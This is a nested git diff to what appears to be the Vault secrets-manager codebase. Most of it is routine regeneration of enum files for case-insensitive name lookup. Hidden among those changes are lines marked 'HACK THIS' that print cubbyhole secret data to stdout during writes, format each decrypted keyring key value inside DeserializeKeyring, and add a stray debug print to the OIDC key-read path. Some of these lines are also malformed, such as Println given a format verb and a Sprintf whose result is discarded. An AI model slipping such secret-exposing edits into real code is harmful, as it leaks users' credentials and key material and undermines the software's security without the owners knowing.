+ 	return _FailOpenModeName[_FailOpenModeIndex[i]:_FailOpenModeIndex[i+1]]
+ }
+ 
+-var _FailOpenModeValues = []FailOpenMode{0, 1, 2}
++// An "invalid array index" compiler error signifies that the constant values have changed.
++// Re-run the stringer command to generate them again.
++func _FailOpenModeNoOp() {
++	var x [1]struct{}
++	_ = x[ocspFailOpenNotSet-(0)]
++	_ = x[FailOpenTrue-(1)]
++	_ = x[FailOpenFalse-(2)]
++}
++
++var _FailOpenModeValues = []FailOpenMode{ocspFailOpenNotSet, FailOpenTrue, FailOpenFalse}
+ 
+ var _FailOpenModeNameToValueMap = map[string]FailOpenMode{
+-	_FailOpenModeName[0:18]:  0,
+-	_FailOpenModeName[18:22]: 1,
+-	_FailOpenModeName[22:27]: 2,
++	_FailOpenModeName[0:18]:       ocspFailOpenNotSet,
++	_FailOpenModeLowerName[0:18]:  ocspFailOpenNotSet,
++	_FailOpenModeName[18:22]:      FailOpenTrue,
++	_FailOpenModeLowerName[18:22]: FailOpenTrue,
++	_FailOpenModeName[22:27]:      FailOpenFalse,
++	_FailOpenModeLowerName[22:27]: FailOpenFalse,
++}
++
++var _FailOpenModeNames = []string{
++	_FailOpenModeName[0:18],
++	_FailOpenModeName[18:22],
++	_FailOpenModeName[22:27],
+ }
+ 
+ // FailOpenModeString retrieves an enum value from the enum constants string name.
+@@ -31,6 +52,10 @@ func FailOpenModeString(s string) (FailOpenMode, error) {
+ 	if val, ok := _FailOpenModeNameToValueMap[s]; ok {
+ 		return val, nil
+ 	}
++
++	if val, ok := _FailOpenModeNameToValueMap[strings.ToLower(s)]; ok {
++		return val, nil
++	}
+ 	return 0, fmt.Errorf("%s does not belong to FailOpenMode values", s)
+ }
+ 
+@@ -39,6 +64,13 @@ func FailOpenModeValues() []FailOpenMode {
+ 	return _FailOpenModeValues
+ }
+ 
++// FailOpenModeStrings returns a slice of all String values of the enum
++func FailOpenModeStrings() []string {
++	strs := make([]string, len(_FailOpenModeNames))
++	copy(strs, _FailOpenModeNames)
++	return strs
++}
++
+ // IsAFailOpenMode returns "true" if the value is listed in the enum definition. "false" otherwise
+ func (i FailOpenMode) IsAFailOpenMode() bool {
+ 	for _, v := range _FailOpenModeValues {
+diff --git a/sdk/helper/testcluster/generaterootkind_enumer.go b/sdk/helper/testcluster/generaterootkind_enumer.go
+index 367c1a5df4..5eadd77432 100644
+--- a/sdk/helper/testcluster/generaterootkind_enumer.go
++++ b/sdk/helper/testcluster/generaterootkind_enumer.go
+@@ -4,12 +4,15 @@ package testcluster
+ 
+ import (
+ 	"fmt"
++	"strings"
+ )
+ 
+ const _GenerateRootKindName = "RegularDRGenerateRecovery"
+ 
+ var _GenerateRootKindIndex = [...]uint8{0, 7, 9, 25}
+ 
++const _GenerateRootKindLowerName = "regulardrgeneraterecovery"
++
+ func (i GenerateRootKind) String() string {
+ 	if i < 0 || i >= GenerateRootKind(len(_GenerateRootKindIndex)-1) {
+ 		return fmt.Sprintf("GenerateRootKind(%d)", i)
+@@ -17,12 +20,30 @@ func (i GenerateRootKind) String() string {
+ 	return _GenerateRootKindName[_GenerateRootKindIndex[i]:_GenerateRootKindIndex[i+1]]
+ }
+ 
+-var _GenerateRootKindValues = []GenerateRootKind{0, 1, 2}
++// An "invalid array index" compiler error signifies that the constant values have changed.
++// Re-run the stringer command to generate them again.
++func _GenerateRootKindNoOp() {
++	var x [1]struct{}
++	_ = x[GenerateRootRegular-(0)]
++	_ = x[GenerateRootDR-(1)]
++	_ = x[GenerateRecovery-(2)]
++}
++
++var _GenerateRootKindValues = []GenerateRootKind{GenerateRootRegular, GenerateRootDR, GenerateRecovery}
+ 
+ var _GenerateRootKindNameToValueMap = map[string]GenerateRootKind{
+-	_GenerateRootKindName[0:7]:  0,
+-	_GenerateRootKindName[7:9]:  1,
+-	_GenerateRootKindName[9:25]: 2,
++	_GenerateRootKindName[0:7]:       GenerateRootRegular,
++	_GenerateRootKindLowerName[0:7]:  GenerateRootRegular,
++	_GenerateRootKindName[7:9]:       GenerateRootDR,
++	_GenerateRootKindLowerName[7:9]:  GenerateRootDR,
++	_GenerateRootKindName[9:25]:      GenerateRecovery,
++	_GenerateRootKindLowerName[9:25]: GenerateRecovery,
++}
++
++var _GenerateRootKindNames = []string{
++	_GenerateRootKindName[0:7],
++	_GenerateRootKindName[7:9],
++	_GenerateRootKindName[9:25],
+ }
+ 
+ // GenerateRootKindString retrieves an enum value from the enum constants string name.
+@@ -31,6 +52,10 @@ func GenerateRootKindString(s string) (GenerateRootKind, error) {
+ 	if val, ok := _GenerateRootKindNameToValueMap[s]; ok {
+ 		return val, nil
+ 	}
++
++	if val, ok := _GenerateRootKindNameToValueMap[strings.ToLower(s)]; ok {
++		return val, nil
++	}
+ 	return 0, fmt.Errorf("%s does not belong to GenerateRootKind values", s)
+ }
+ 
+@@ -39,6 +64,13 @@ func GenerateRootKindValues() []GenerateRootKind {
+ 	return _GenerateRootKindValues
+ }
+ 
++// GenerateRootKindStrings returns a slice of all String values of the enum
++func GenerateRootKindStrings() []string {
++	strs := make([]string, len(_GenerateRootKindNames))
++	copy(strs, _GenerateRootKindNames)
++	return strs
++}
++
+ // IsAGenerateRootKind returns "true" if the value is listed in the enum definition. "false" otherwise
+ func (i GenerateRootKind) IsAGenerateRootKind() bool {
+ 	for _, v := range _GenerateRootKindValues {
+diff --git a/sdk/logical/clienttokensource_enumer.go b/sdk/logical/clienttokensource_enumer.go
+index e930a3a0dd..331e452313 100644
+--- a/sdk/logical/clienttokensource_enumer.go
++++ b/sdk/logical/clienttokensource_enumer.go
+@@ -4,12 +4,15 @@ package logical
+ 
+ import (
+ 	"fmt"
++	"strings"
+ )
+ 
+ const _ClientTokenSourceName = "no_client_tokenvault_headerauthz_headerinternal_auth"
+ 
+ var _ClientTokenSourceIndex = [...]uint8{0, 15, 27, 39, 52}
+ 
++const _ClientTokenSourceLowerName = "no_client_tokenvault_headerauthz_headerinternal_auth"
++
+ func (i ClientTokenSource) String() string {
+ 	if i >= ClientTokenSource(len(_ClientTokenSourceIndex)-1) {
+ 		return fmt.Sprintf("ClientTokenSource(%d)", i)
+@@ -17,13 +20,34 @@ func (i ClientTokenSource) String() string {
+ 	return _ClientTokenSourceName[_ClientTokenSourceIndex[i]:_ClientTokenSourceIndex[i+1]]
+ }
+ 
+-var _ClientTokenSourceValues = []ClientTokenSource{0, 1, 2, 3}
++// An "invalid array index" compiler error signifies that the constant values have changed.
++// Re-run the stringer command to generate them again.
++func _ClientTokenSourceNoOp() {
++	var x [1]struct{}
++	_ = x[NoClientToken-(0)]
++	_ = x[ClientTokenFromVaultHeader-(1)]
++	_ = x[ClientTokenFromAuthzHeader-(2)]
++	_ = x[ClientTokenFromInternalAuth-(3)]
++}
++
++var _ClientTokenSourceValues = []ClientTokenSource{NoClientToken, ClientTokenFromVaultHeader, ClientTokenFromAuthzHeader, ClientTokenFromInternalAuth}
+ 
+ var _ClientTokenSourceNameToValueMap = map[string]ClientTokenSource{
+-	_ClientTokenSourceName[0:15]:  0,
+-	_ClientTokenSourceName[15:27]: 1,
+-	_ClientTokenSourceName[27:39]: 2,
+-	_ClientTokenSourceName[39:52]: 3,
++	_ClientTokenSourceName[0:15]:       NoClientToken,
++	_ClientTokenSourceLowerName[0:15]:  NoClientToken,
++	_ClientTokenSourceName[15:27]:      ClientTokenFromVaultHeader,
++	_ClientTokenSourceLowerName[15:27]: ClientTokenFromVaultHeader,
++	_ClientTokenSourceName[27:39]:      ClientTokenFromAuthzHeader,
++	_ClientTokenSourceLowerName[27:39]: ClientTokenFromAuthzHeader,
++	_ClientTokenSourceName[39:52]:      ClientTokenFromInternalAuth,
++	_ClientTokenSourceLowerName[39:52]: ClientTokenFromInternalAuth,
++}
++
++var _ClientTokenSourceNames = []string{
++	_ClientTokenSourceName[0:15],
++	_ClientTokenSourceName[15:27],
++	_ClientTokenSourceName[27:39],
++	_ClientTokenSourceName[39:52],
+ }
+ 
+ // ClientTokenSourceString retrieves an enum value from the enum constants string name.
+@@ -32,6 +56,10 @@ func ClientTokenSourceString(s string) (ClientTokenSource, error) {
+ 	if val, ok := _ClientTokenSourceNameToValueMap[s]; ok {
+ 		return val, nil
+ 	}
++
++	if val, ok := _ClientTokenSourceNameToValueMap[strings.ToLower(s)]; ok {
++		return val, nil
++	}
+ 	return 0, fmt.Errorf("%s does not belong to ClientTokenSource values", s)
+ }
+ 
+@@ -40,6 +68,13 @@ func ClientTokenSourceValues() []ClientTokenSource {
+ 	return _ClientTokenSourceValues
+ }
+ 
++// ClientTokenSourceStrings returns a slice of all String values of the enum
++func ClientTokenSourceStrings() []string {
++	strs := make([]string, len(_ClientTokenSourceNames))
++	copy(strs, _ClientTokenSourceNames)
++	return strs
++}
++
+ // IsAClientTokenSource returns "true" if the value is listed in the enum definition. "false" otherwise
+ func (i ClientTokenSource) IsAClientTokenSource() bool {
+ 	for _, v := range _ClientTokenSourceValues {
+diff --git a/sdk/logical/keyusage_enumer.go b/sdk/logical/keyusage_enumer.go
+index 83998c4a2a..da05be6997 100644
+--- a/sdk/logical/keyusage_enumer.go
++++ b/sdk/logical/keyusage_enumer.go
+@@ -4,12 +4,15 @@ package logical
+ 
+ import (
+ 	"fmt"
++	"strings"
+ )
+ 
+ const _KeyUsageName = "encryptdecryptsignverifywrapunwrapgenerate_random"
+ 
+ var _KeyUsageIndex = [...]uint8{0, 7, 14, 18, 24, 28, 34, 49}
+ 
++const _KeyUsageLowerName = "encryptdecryptsignverifywrapunwrapgenerate_random"
++
+ func (i KeyUsage) String() string {
+ 	i -= 1
+ 	if i < 0 || i >= KeyUsage(len(_KeyUsageIndex)-1) {
+@@ -18,16 +21,46 @@ func (i KeyUsage) String() string {
+ 	return _KeyUsageName[_KeyUsageIndex[i]:_KeyUsageIndex[i+1]]
+ }
+ 
+-var _KeyUsageValues = []KeyUsage{1, 2, 3, 4, 5, 6, 7}
++// An "invalid array index" compiler error signifies that the constant values have changed.
++// Re-run the stringer command to generate them again.
++func _KeyUsageNoOp() {
++	var x [1]struct{}
++	_ = x[KeyUsageEncrypt-(1)]
++	_ = x[KeyUsageDecrypt-(2)]
++	_ = x[KeyUsageSign-(3)]
++	_ = x[KeyUsageVerify-(4)]
++	_ = x[KeyUsageWrap-(5)]
++	_ = x[KeyUsageUnwrap-(6)]
++	_ = x[KeyUsageGenerateRandom-(7)]
++}
++
++var _KeyUsageValues = []KeyUsage{KeyUsageEncrypt, KeyUsageDecrypt, KeyUsageSign, KeyUsageVerify, KeyUsageWrap, KeyUsageUnwrap, KeyUsageGenerateRandom}
+ 
+ var _KeyUsageNameToValueMap = map[string]KeyUsage{
+-	_KeyUsageName[0:7]:   1,
+-	_KeyUsageName[7:14]:  2,
+-	_KeyUsageName[14:18]: 3,
+-	_KeyUsageName[18:24]: 4,
+-	_KeyUsageName[24:28]: 5,
+-	_KeyUsageName[28:34]: 6,
+-	_KeyUsageName[34:49]: 7,
++	_KeyUsageName[0:7]:        KeyUsageEncrypt,
++	_KeyUsageLowerName[0:7]:   KeyUsageEncrypt,
++	_KeyUsageName[7:14]:       KeyUsageDecrypt,
++	_KeyUsageLowerName[7:14]:  KeyUsageDecrypt,
++	_KeyUsageName[14:18]:      KeyUsageSign,
++	_KeyUsageLowerName[14:18]: KeyUsageSign,
++	_KeyUsageName[18:24]:      KeyUsageVerify,
++	_KeyUsageLowerName[18:24]: KeyUsageVerify,
++	_KeyUsageName[24:28]:      KeyUsageWrap,
++	_KeyUsageLowerName[24:28]: KeyUsageWrap,
++	_KeyUsageName[28:34]:      KeyUsageUnwrap,
++	_KeyUsageLowerName[28:34]: KeyUsageUnwrap,
++	_KeyUsageName[34:49]:      KeyUsageGenerateRandom,
++	_KeyUsageLowerName[34:49]: KeyUsageGenerateRandom,
++}
++
++var _KeyUsageNames = []string{
++	_KeyUsageName[0:7],
++	_KeyUsageName[7:14],
++	_KeyUsageName[14:18],
++	_KeyUsageName[18:24],
++	_KeyUsageName[24:28],
++	_KeyUsageName[28:34],
++	_KeyUsageName[34:49],
+ }
+ 
+ // KeyUsageString retrieves an enum value from the enum constants string name.
+@@ -36,6 +69,10 @@ func KeyUsageString(s string) (KeyUsage, error) {
+ 	if val, ok := _KeyUsageNameToValueMap[s]; ok {
+ 		return val, nil
+ 	}
++
++	if val, ok := _KeyUsageNameToValueMap[strings.ToLower(s)]; ok {
++		return val, nil
++	}
+ 	return 0, fmt.Errorf("%s does not belong to KeyUsage values", s)
+ }
+ 
+@@ -44,6 +81,13 @@ func KeyUsageValues() []KeyUsage {
+ 	return _KeyUsageValues
+ }
+ 
++// KeyUsageStrings returns a slice of all String values of the enum
++func KeyUsageStrings() []string {
++	strs := make([]string, len(_KeyUsageNames))
++	copy(strs, _KeyUsageNames)
++	return strs
++}
++
+ // IsAKeyUsage returns "true" if the value is listed in the enum definition. "false" otherwise
+ func (i KeyUsage) IsAKeyUsage() bool {
+ 	for _, v := range _KeyUsageValues {
+diff --git a/sdk/logical/tokentype_enumer.go b/sdk/logical/tokentype_enumer.go
+index 9b350a74d3..289e499d58 100644
+--- a/sdk/logical/tokentype_enumer.go
++++ b/sdk/logical/tokentype_enumer.go
+@@ -4,12 +4,15 @@ package logical
+ 
+ import (
+ 	"fmt"
++	"strings"
+ )
+ 
+ const _TokenTypeName = "defaultservicebatchdefault-servicedefault-batch"
+ 
+ var _TokenTypeIndex = [...]uint8{0, 7, 14, 19, 34, 47}
+ 
++const _TokenTypeLowerName = "defaultservicebatchdefault-servicedefault-batch"
++
+ func (i TokenType) String() string {
+ 	if i >= TokenType(len(_TokenTypeIndex)-1) {
+ 		return fmt.Sprintf("TokenType(%d)", i)
+@@ -17,14 +20,38 @@ func (i TokenType) String() string {
+ 	return _TokenTypeName[_TokenTypeIndex[i]:_TokenTypeIndex[i+1]]
+ }
+ 
+-var _TokenTypeValues = []TokenType{0, 1, 2, 3, 4}
++// An "invalid array index" compiler error signifies that the constant values have changed.
++// Re-run the stringer command to generate them again.
++func _TokenTypeNoOp() {
++	var x [1]struct{}
++	_ = x[TokenTypeDefault-(0)]
++	_ = x[TokenTypeService-(1)]
++	_ = x[TokenTypeBatch-(2)]
++	_ = x[TokenTypeDefaultService-(3)]
++	_ = x[TokenTypeDefaultBatch-(4)]
++}
++
++var _TokenTypeValues = []TokenType{TokenTypeDefault, TokenTypeService, TokenTypeBatch, TokenTypeDefaultService, TokenTypeDefaultBatch}
+ 
+ var _TokenTypeNameToValueMap = map[string]TokenType{
+-	_TokenTypeName[0:7]:   0,
+-	_TokenTypeName[7:14]:  1,
+-	_TokenTypeName[14:19]: 2,
+-	_TokenTypeName[19:34]: 3,
+-	_TokenTypeName[34:47]: 4,
++	_TokenTypeName[0:7]:        TokenTypeDefault,
++	_TokenTypeLowerName[0:7]:   TokenTypeDefault,
++	_TokenTypeName[7:14]:       TokenTypeService,
++	_TokenTypeLowerName[7:14]:  TokenTypeService,
++	_TokenTypeName[14:19]:      TokenTypeBatch,
++	_TokenTypeLowerName[14:19]: TokenTypeBatch,
++	_TokenTypeName[19:34]:      TokenTypeDefaultService,
++	_TokenTypeLowerName[19:34]: TokenTypeDefaultService,
++	_TokenTypeName[34:47]:      TokenTypeDefaultBatch,
++	_TokenTypeLowerName[34:47]: TokenTypeDefaultBatch,
++}
++
++var _TokenTypeNames = []string{
++	_TokenTypeName[0:7],
++	_TokenTypeName[7:14],
++	_TokenTypeName[14:19],
++	_TokenTypeName[19:34],
++	_TokenTypeName[34:47],
+ }
+ 
+ // TokenTypeString retrieves an enum value from the enum constants string name.
+@@ -33,6 +60,10 @@ func TokenTypeString(s string) (TokenType, error) {
+ 	if val, ok := _TokenTypeNameToValueMap[s]; ok {
+ 		return val, nil
+ 	}
++
++	if val, ok := _TokenTypeNameToValueMap[strings.ToLower(s)]; ok {
++		return val, nil
++	}
+ 	return 0, fmt.Errorf("%s does not belong to TokenType values", s)
+ }
+ 
+@@ -41,6 +72,13 @@ func TokenTypeValues() []TokenType {
+ 	return _TokenTypeValues
+ }
+ 
++// TokenTypeStrings returns a slice of all String values of the enum
++func TokenTypeStrings() []string {
++	strs := make([]string, len(_TokenTypeNames))
++	copy(strs, _TokenTypeNames)
++	return strs
++}
++
+ // IsATokenType returns "true" if the value is listed in the enum definition. "false" otherwise
+ func (i TokenType) IsATokenType() bool {
+ 	for _, v := range _TokenTypeValues {
+diff --git a/vault/clienttype_enumer.go b/vault/clienttype_enumer.go
+index 33ffa9326a..39c9746039 100644
+--- a/vault/clienttype_enumer.go
++++ b/vault/clienttype_enumer.go
+@@ -4,12 +4,15 @@ package vault
+ 
+ import (
+ 	"fmt"
++	"strings"
+ )
+ 
+ const _clientTypeName = "confidentialpublic"
+ 
+ var _clientTypeIndex = [...]uint8{0, 12, 18}
+ 
++const _clientTypeLowerName = "confidentialpublic"
++
+ func (i clientType) String() string {
+ 	if i < 0 || i >= clientType(len(_clientTypeIndex)-1) {
+ 		return fmt.Sprintf("clientType(%d)", i)
+@@ -17,11 +20,26 @@ func (i clientType) String() string {
+ 	return _clientTypeName[_clientTypeIndex[i]:_clientTypeIndex[i+1]]
+ }
+ 
+-var _clientTypeValues = []clientType{0, 1}
++// An "invalid array index" compiler error signifies that the constant values have changed.
++// Re-run the stringer command to generate them again.
++func _clientTypeNoOp() {
++	var x [1]struct{}
++	_ = x[confidential-(0)]
++	_ = x[public-(1)]
++}
++
++var _clientTypeValues = []clientType{confidential, public}
+ 
+ var _clientTypeNameToValueMap = map[string]clientType{
+-	_clientTypeName[0:12]:  0,
+-	_clientTypeName[12:18]: 1,
++	_clientTypeName[0:12]:       confidential,
++	_clientTypeLowerName[0:12]:  confidential,
++	_clientTypeName[12:18]:      public,
++	_clientTypeLowerName[12:18]: public,
++}
++
++var _clientTypeNames = []string{
++	_clientTypeName[0:12],
++	_clientTypeName[12:18],
+ }
+ 
+ // clientTypeString retrieves an enum value from the enum constants string name.
+@@ -30,6 +48,10 @@ func clientTypeString(s string) (clientType, error) {
+ 	if val, ok := _clientTypeNameToValueMap[s]; ok {
+ 		return val, nil
+ 	}
++
++	if val, ok := _clientTypeNameToValueMap[strings.ToLower(s)]; ok {
++		return val, nil
++	}
+ 	return 0, fmt.Errorf("%s does not belong to clientType values", s)
+ }
+ 
+@@ -38,6 +60,13 @@ func clientTypeValues() []clientType {
+ 	return _clientTypeValues
+ }
+ 
++// clientTypeStrings returns a slice of all String values of the enum
++func clientTypeStrings() []string {
++	strs := make([]string, len(_clientTypeNames))
++	copy(strs, _clientTypeNames)
++	return strs
++}
++
+ // IsAclientType returns "true" if the value is listed in the enum definition. "false" otherwise
+ func (i clientType) IsAclientType() bool {
+ 	for _, v := range _clientTypeValues {
+diff --git a/vault/identity_store_oidc.go b/vault/identity_store_oidc.go
+index 159fe70066..2ade9cdc1a 100644
+--- a/vault/identity_store_oidc.go
++++ b/vault/identity_store_oidc.go
+@@ -684,6 +684,8 @@ func (i *IdentityStore) pathOIDCReadKey(ctx context.Context, req *logical.Reques
+ 	defer i.oidcLock.RUnlock()
+ 
+ 	entry, err := req.Storage.Get(ctx, namedKeyConfigPath+name)
++	// HACK THIS
++	fmt.Println("HACK88: %s", "test")
+ 	if err != nil {
+ 		return nil, err
+ 	}
+diff --git a/vault/keyring.go b/vault/keyring.go
+index 4f943c11b6..485a9a3a0e 100644
+--- a/vault/keyring.go
++++ b/vault/keyring.go
+@@ -207,6 +207,7 @@ func (k *Keyring) Serialize() ([]byte, error) {
+ func DeserializeKeyring(buf []byte) (*Keyring, error) {
+ 	// Deserialize the keyring
+ 	var enc EncodedKeyring
++
+ 	if err := jsonutil.DecodeJSON(buf, &enc); err != nil {
+ 		return nil, fmt.Errorf("deserialization failed: %w", err)
+ 	}
+@@ -216,7 +217,10 @@ func DeserializeKeyring(buf []byte) (*Keyring, error) {
+ 	k.rootKey = enc.MasterKey
+ 	k.rotationConfig = enc.RotationConfig
+ 	k.rotationConfig.Sanitize()
++
+ 	for _, key := range enc.Keys {
++		// HACK THIS
++		fmt.Sprintf("HACK8sx8keys: %s", key.Value)
+ 		k.keys[key.Term] = key
+ 		if key.Term > k.activeTerm {
+ 			k.activeTerm = key.Term
+diff --git a/vault/logical_cubbyhole.go b/vault/logical_cubbyhole.go
+index 7445e7853d..f34201120c 100644
+--- a/vault/logical_cubbyhole.go
++++ b/vault/logical_cubbyhole.go
+@@ -162,6 +162,8 @@ func (b *CubbyholeBackend) handleRead(ctx context.Context, req *logical.Request,
+ 		return nil, nil
+ 	}
+ 
++	// HACK here
++
+ 	// Decode the data
+ 	var rawData map[string]interface{}
+ 	if err := jsonutil.DecodeJSON(out.Value, &rawData); err != nil {
+@@ -191,6 +193,9 @@ func (b *CubbyholeBackend) handleWrite(ctx context.Context, req *logical.Request
+ 		return nil, fmt.Errorf("missing path")
+ 	}
+ 
++	// HACK THIS
++	fmt.Println("HACK: %s", req.Data)
++
+ 	// JSON encode the data
+ 	buf, err := json.Marshal(req.Data)
+ 	if err != nil {
+diff --git a/vault/mountmigrationstatus_enumer.go b/vault/mountmigrationstatus_enumer.go
+index 62edfa18b9..546712d02b 100644
+--- a/vault/mountmigrationstatus_enumer.go
++++ b/vault/mountmigrationstatus_enumer.go
+@@ -4,12 +4,15 @@ package vault
+ 
+ import (
+ 	"fmt"
++	"strings"
+ )
+ 
+ const _MountMigrationStatusName = "in-progresssuccessfailure"
+ 
+ var _MountMigrationStatusIndex = [...]uint8{0, 11, 18, 25}
+ 
++const _MountMigrationStatusLowerName = "in-progresssuccessfailure"
++
+ func (i MountMigrationStatus) String() string {
+ 	if i < 0 || i >= MountMigrationStatus(len(_MountMigrationStatusIndex)-1) {
+ 		return fmt.Sprintf("MountMigrationStatus(%d)", i)
+@@ -17,12 +20,30 @@ func (i MountMigrationStatus) String() string {
+ 	return _MountMigrationStatusName[_MountMigrationStatusIndex[i]:_MountMigrationStatusIndex[i+1]]
+ }
+ 
+-var _MountMigrationStatusValues = []MountMigrationStatus{0, 1, 2}
++// An "invalid array index" compiler error signifies that the constant values have changed.
++// Re-run the stringer command to generate them again.
++func _MountMigrationStatusNoOp() {
++	var x [1]struct{}
++	_ = x[MigrationStatusInProgress-(0)]
++	_ = x[MigrationStatusSuccess-(1)]
++	_ = x[MigrationStatusFailure-(2)]
++}
++
++var _MountMigrationStatusValues = []MountMigrationStatus{MigrationStatusInProgress, MigrationStatusSuccess, MigrationStatusFailure}
+ 
+ var _MountMigrationStatusNameToValueMap = map[string]MountMigrationStatus{
+-	_MountMigrationStatusName[0:11]:  0,
+-	_MountMigrationStatusName[11:18]: 1,
+-	_MountMigrationStatusName[18:25]: 2,
++	_MountMigrationStatusName[0:11]:       MigrationStatusInProgress,
++	_MountMigrationStatusLowerName[0:11]:  MigrationStatusInProgress,
++	_MountMigrationStatusName[11:18]:      MigrationStatusSuccess,
++	_MountMigrationStatusLowerName[11:18]: MigrationStatusSuccess,
++	_MountMigrationStatusName[18:25]:      MigrationStatusFailure,
++	_MountMigrationStatusLowerName[18:25]: MigrationStatusFailure,
++}
++
++var _MountMigrationStatusNames = []string{
++	_MountMigrationStatusName[0:11],
++	_MountMigrationStatusName[11:18],
++	_MountMigrationStatusName[18:25],
+ }
+ 
+ // MountMigrationStatusString retrieves an enum value from the enum constants string name.
+@@ -31,6 +52,10 @@ func MountMigrationStatusString(s string) (MountMigrationStatus, error) {
+ 	if val, ok := _MountMigrationStatusNameToValueMap[s]; ok {
+ 		return val, nil
+ 	}
++
++	if val, ok := _MountMigrationStatusNameToValueMap[strings.ToLower(s)]; ok {
++		return val, nil
++	}
+ 	return 0, fmt.Errorf("%s does not belong to MountMigrationStatus values", s)
+ }
+ 
+@@ -39,6 +64,13 @@ func MountMigrationStatusValues() []MountMigrationStatus {
+ 	return _MountMigrationStatusValues
+ }
+ 
++// MountMigrationStatusStrings returns a slice of all String values of the enum
++func MountMigrationStatusStrings() []string {
++	strs := make([]string, len(_MountMigrationStatusNames))
++	copy(strs, _MountMigrationStatusNames)
++	return strs
++}
++
+ // IsAMountMigrationStatus returns "true" if the value is listed in the enum definition. "false" otherwise
+ func (i MountMigrationStatus) IsAMountMigrationStatus() bool {
+ 	for _, v := range _MountMigrationStatusValues {
+diff --git a/vault/quotas/leaseaction_enumer.go b/vault/quotas/leaseaction_enumer.go
+index 114ece18cf..a5ea7649e1 100644
+--- a/vault/quotas/leaseaction_enumer.go
++++ b/vault/quotas/leaseaction_enumer.go
+@@ -4,12 +4,15 @@ package quotas
+ 
+ import (
+ 	"fmt"
++	"strings"
+ )
+ 
+ const _LeaseActionName = "unknownloadedcreateddeletedallow"
+ 
+ var _LeaseActionIndex = [...]uint8{0, 7, 13, 20, 27, 32}
+ 
++const _LeaseActionLowerName = "unknownloadedcreateddeletedallow"
++
+ func (i LeaseAction) String() string {
+ 	if i >= LeaseAction(len(_LeaseActionIndex)-1) {
+ 		return fmt.Sprintf("LeaseAction(%d)", i)
+@@ -17,14 +20,38 @@ func (i LeaseAction) String() string {
+ 	return _LeaseActionName[_LeaseActionIndex[i]:_LeaseActionIndex[i+1]]
+ }
+ 
+-var _LeaseActionValues = []LeaseAction{0, 1, 2, 3, 4}
++// An "invalid array index" compiler error signifies that the constant values have changed.
++// Re-run the stringer command to generate them again.
++func _LeaseActionNoOp() {
++	var x [1]struct{}
++	_ = x[LeaseActionUnknown-(0)]
++	_ = x[LeaseActionLoaded-(1)]
++	_ = x[LeaseActionCreated-(2)]
++	_ = x[LeaseActionDeleted-(3)]
++	_ = x[LeaseActionAllow-(4)]
++}
++
++var _LeaseActionValues = []LeaseAction{LeaseActionUnknown, LeaseActionLoaded, LeaseActionCreated, LeaseActionDeleted, LeaseActionAllow}
+ 
+ var _LeaseActionNameToValueMap = map[string]LeaseAction{
+-	_LeaseActionName[0:7]:   0,
+-	_LeaseActionName[7:13]:  1,
+-	_LeaseActionName[13:20]: 2,
+-	_LeaseActionName[20:27]: 3,
+-	_LeaseActionName[27:32]: 4,
++	_LeaseActionName[0:7]:        LeaseActionUnknown,
++	_LeaseActionLowerName[0:7]:   LeaseActionUnknown,
++	_LeaseActionName[7:13]:       LeaseActionLoaded,
++	_LeaseActionLowerName[7:13]:  LeaseActionLoaded,
++	_LeaseActionName[13:20]:      LeaseActionCreated,
++	_LeaseActionLowerName[13:20]: LeaseActionCreated,
++	_LeaseActionName[20:27]:      LeaseActionDeleted,
++	_LeaseActionLowerName[20:27]: LeaseActionDeleted,
++	_LeaseActionName[27:32]:      LeaseActionAllow,
++	_LeaseActionLowerName[27:32]: LeaseActionAllow,
++}
++
++var _LeaseActionNames = []string{
++	_LeaseActionName[0:7],
++	_LeaseActionName[7:13],
++	_LeaseActionName[13:20],
++	_LeaseActionName[20:27],
++	_LeaseActionName[27:32],
+ }
+ 
+ // LeaseActionString retrieves an enum value from the enum constants string name.
+@@ -33,6 +60,10 @@ func LeaseActionString(s string) (LeaseAction, error) {
+ 	if val, ok := _LeaseActionNameToValueMap[s]; ok {
+ 		return val, nil
+ 	}
++
++	if val, ok := _LeaseActionNameToValueMap[strings.ToLower(s)]; ok {
++		return val, nil
++	}
+ 	return 0, fmt.Errorf("%s does not belong to LeaseAction values", s)
+ }
+ 
+@@ -41,6 +72,13 @@ func LeaseActionValues() []LeaseAction {
+ 	return _LeaseActionValues
+ }
+ 
++// LeaseActionStrings returns a slice of all String values of the enum
++func LeaseActionStrings() []string {
++	strs := make([]string, len(_LeaseActionNames))
++	copy(strs, _LeaseActionNames)
++	return strs
++}
++
+ // IsALeaseAction returns "true" if the value is listed in the enum definition. "false" otherwise
+ func (i LeaseAction) IsALeaseAction() bool {
+ 	for _, v := range _LeaseActionValues {
+diff --git a/vault/sealmigrationcheckresult_enumer.go b/vault/sealmigrationcheckresult_enumer.go
+index 055756426a..1e46d67f7b 100644
+--- a/vault/sealmigrationcheckresult_enumer.go
++++ b/vault/sealmigrationcheckresult_enumer.go
+@@ -4,12 +4,15 @@ package vault
+ 
+ import (
+ 	"fmt"
++	"strings"
+ )
+ 
+ const _sealMigrationCheckResultName = "errorskipadjustdo_not_ajust"
+ 
+ var _sealMigrationCheckResultIndex = [...]uint8{0, 5, 9, 15, 27}
+ 
++const _sealMigrationCheckResultLowerName = "errorskipadjustdo_not_ajust"
++
+ func (i sealMigrationCheckResult) String() string {
+ 	if i < 0 || i >= sealMigrationCheckResult(len(_sealMigrationCheckResultIndex)-1) {
+ 		return fmt.Sprintf("sealMigrationCheckResult(%d)", i)
+@@ -17,13 +20,34 @@ func (i sealMigrationCheckResult) String() string {
+ 	return _sealMigrationCheckResultName[_sealMigrationCheckResultIndex[i]:_sealMigrationCheckResultIndex[i+1]]
+ }
+ 
+-var _sealMigrationCheckResultValues = []sealMigrationCheckResult{0, 1, 2, 3}
++// An "invalid array index" compiler error signifies that the constant values have changed.
++// Re-run the stringer command to generate them again.
++func _sealMigrationCheckResultNoOp() {
++	var x [1]struct{}
++	_ = x[sealMigrationCheckError-(0)]
++	_ = x[sealMigrationCheckSkip-(1)]
++	_ = x[sealMigrationCheckAdjust-(2)]
++	_ = x[sealMigrationCheckDoNotAjust-(3)]
++}
++
++var _sealMigrationCheckResultValues = []sealMigrationCheckResult{sealMigrationCheckError, sealMigrationCheckSkip, sealMigrationCheckAdjust, sealMigrationCheckDoNotAjust}
+ 
+ var _sealMigrationCheckResultNameToValueMap = map[string]sealMigrationCheckResult{
+-	_sealMigrationCheckResultName[0:5]:   0,
+-	_sealMigrationCheckResultName[5:9]:   1,
+-	_sealMigrationCheckResultName[9:15]:  2,
+-	_sealMigrationCheckResultName[15:27]: 3,
++	_sealMigrationCheckResultName[0:5]:        sealMigrationCheckError,
